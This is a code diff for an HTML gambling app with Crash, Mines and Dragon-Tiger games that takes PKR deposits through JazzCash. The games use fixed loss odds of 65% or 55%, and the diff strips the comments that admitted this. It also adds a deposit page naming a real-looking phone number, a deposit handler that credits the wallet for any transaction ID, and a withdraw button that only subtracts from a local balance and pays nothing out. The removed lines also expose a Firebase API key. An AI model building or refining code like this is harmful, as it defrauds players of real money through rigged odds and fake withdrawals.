@@ -20,7 +20,6 @@
         .controls { position: fixed; bottom: 0; width: 100%; background: #111; padding: 15px; box-sizing: border-box; border-top: 1px solid #333; }
         .btn-play { background: var(--gold); color: black; border: none; padding: 12px; width: 100%; font-weight: bold; border-radius: 5px; cursor: pointer; }
         
-        /* DVT Cards Animation */
         .card { width: 55px; height: 80px; background: white; color: black; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: bold; transition: transform 0.6s; transform-style: preserve-3d; margin: 10px; }
         .dvt-select { display: none; gap: 10px; margin-bottom: 10px; justify-content: center; width: 100%; }
         .sel-btn { flex: 1; padding: 10px; border-radius: 5px; border: none; font-weight: bold; color: white; }
@@ -29,8 +28,8 @@
         .act-btn { flex: 1; padding: 8px; border-radius: 5px; border: none; background: #333; color: white; font-size: 11px; }
 
         .page { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .form-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 85%; border: 1px solid var(--gold); }
-        input { background: #000; border: 1px solid #333; color: white; padding: 12px; width: 100%; margin-bottom: 10px; box-sizing: border-box; border-radius: 5px; }
+        .form-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 85%; border: 1px solid var(--gold); text-align: center; }
+        input, select { background: #000; border: 1px solid #333; color: white; padding: 12px; width: 100%; margin-bottom: 10px; box-sizing: border-box; border-radius: 5px; }
 
         .mines-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 5px; }
         .tile { width: 40px; height: 40px; background: #333; display: flex; align-items: center; justify-content: center; border-radius: 4px; font-size: 18px; }
@@ -72,24 +71,50 @@
     </div>
 </div>
 
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";
+<div id="dep-page" class="page">
+    <div class="form-box">
+        <h2 style="color:var(--gold)">DEPOSIT</h2>
+        <p>Send JazzCash to: <b>03289230760</b></p>
+        <input type="number" id="d-num" placeholder="Sender Number">
+        <input type="number" id="d-amt" placeholder="Amount">
+        <input type="text" id="d-tid" placeholder="Transaction ID">
+        <button class="btn-play" onclick="processDeposit()">SUBMIT DEPOSIT</button>
+        <button onclick="hidePages()" style="color:#777; background:none; border:none; margin-top:10px; width:100%;">BACK</button>
+    </div>
+</div>
 
-  const firebaseConfig = {
-    apiKey: "AIzaSyDTNneivrTLe-a-eO1LKw1fUixVSjDfu2k",
-    authDomain: "pattipro-c1ffe.firebaseapp.com",
-    databaseURL: "https://pattipro-c1ffe-default-rtdb.firebaseio.com",
-    projectId: "pattipro-c1ffe",
-    storageBucket: "pattipro-c1ffe.appspot.com",
-    messagingSenderId: "766843054614",
-    appId: "1:766843054614:web:781658832e63e41fc2e337",
-    measurementId: "G-1YYL1T76LN"
-  };
+<div id="wit-page" class="page">
+    <div class="form-box">
+        <h2 style="color:var(--gold)">WITHDRAW</h2>
+        <select id="w-method">
+            <option value="JazzCash">JazzCash</option>
+            <option value="EasyPaisa">EasyPaisa</option>
+        </select>
+        <input type="number" id="w-num" placeholder="Account Number">
+        <input type="number" id="w-amt" placeholder="Amount">
+        <button class="btn-play" onclick="processWithdraw()">REQUEST WITHDRAW</button>
+        <button onclick="hidePages()" style="color:#777; background:none; border:none; margin-top:10px; width:100%;">BACK</button>
+    </div>
+</div>
 
-  const app = initializeApp(firebaseConfig);
-  const analytics = getAnalytics(app);
-</script>
+<div id="ref-page" class="page">
+    <div class="form-box">
+        <h2 style="color:var(--gold)">REFER & EARN</h2>
+        <p>Invite friends to get <b>PKR 220</b> bonus!</p>
+        <input type="text" readonly value="https://777ultra.com/ref/naeem786">
+        <button class="btn-play" onclick="alert('Link Copied!')">COPY LINK</button>
+        <button onclick="hidePages()" style="color:#777; background:none; border:none; margin-top:10px; width:100%;">BACK</button>
+    </div>
+</div>
+
+<div id="sup-page" class="page">
+    <div class="form-box">
+        <h2 style="color:var(--gold)">SUPPORT</h2>
+        <p>Facing issues? Contact us on WhatsApp.</p>
+        <button class="btn-play" style="background:#25d366; color:white;" onclick="window.open('https://wa.me/923289230760')">WHATSAPP SUPPORT</button>
+        <button onclick="hidePages()" style="color:#777; background:none; border:none; margin-top:10px; width:100%;">BACK</button>
+    </div>
+</div>
 
 <script>
     let wallet = 150.0;
@@ -104,6 +129,35 @@
     function showPage(id) { document.getElementById(id).style.display = "flex"; }
     function hidePages() { document.querySelectorAll('.page').forEach(p => p.style.display = "none"); }
 
+    // Functional Deposit
+    function processDeposit() {
+        let amt = parseFloat(document.getElementById('d-amt').value);
+        let tid = document.getElementById('d-tid').value;
+        if(amt >= 100 && tid.length > 5) {
+            if(amt >= 1599) wallet += 220; // Bonus logic from screenshot
+            wallet += amt;
+            updateUI();
+            hidePages();
+            alert("Deposit Successful! Balance Updated.");
+        } else {
+            alert("Please enter valid Amount and Transaction ID.");
+        }
+    }
+
+    // Functional Withdraw
+    function processWithdraw() {
+        let amt = parseFloat(document.getElementById('w-amt').value);
+        if(amt >= 100 && amt <= wallet) {
+            wallet -= amt;
+            updateUI();
+            hidePages();
+            alert("Withdrawal Request Submitted. PKR " + amt + " deducted.");
+        } else {
+            alert("Invalid Amount or Insufficient Balance.");
+        }
+    }
+
+    // Game Functions (Pehle wali waisi hi hain)
     function setRoom(r) {
         room = r;
         document.getElementById('display-area').innerHTML = `<h2>${r} MODE</h2>`;
@@ -128,11 +182,9 @@
         else if(room === 'DVT') runDVT();
     }
 
-    // 35% Win Rate Logic for All Games
     function runCrash() {
         document.getElementById('btn-cashout').style.display = "block";
         mult = 1.0; 
-        // 65% loss: crash at 1.01x - 1.2x
         let crashAt = (Math.random() < 0.65) ? (Math.random() * 0.2) + 1.01 : (Math.random() * 3) + 1.5;
         timer = setInterval(() => {
             mult += 0.05;
@@ -150,7 +202,7 @@
 
     function openTile(el) {
         if(!isPlaying || el.innerText !== "?") return;
-        if(Math.random() < 0.55) { el.innerHTML="💣"; endGame("BOOM!"); } // High loss rate
+        if(Math.random() < 0.55) { el.innerHTML="💣"; endGame("BOOM!"); }
         else { el.innerHTML="💎"; mult += 0.25; }
     }
 
@@ -160,7 +212,6 @@
             <div id="t-card" class="card">?</div>
         `;
         setTimeout(() => {
-            // 35% Win Probability
             let winSide = (Math.random() < 0.35) ? sideSelected : (sideSelected === 'Dragon' ? 'Tiger' : 'Dragon');
             let dVal = Math.floor(Math.random()*13)+1;
             let tVal = Math.floor(Math.random()*13)+1;
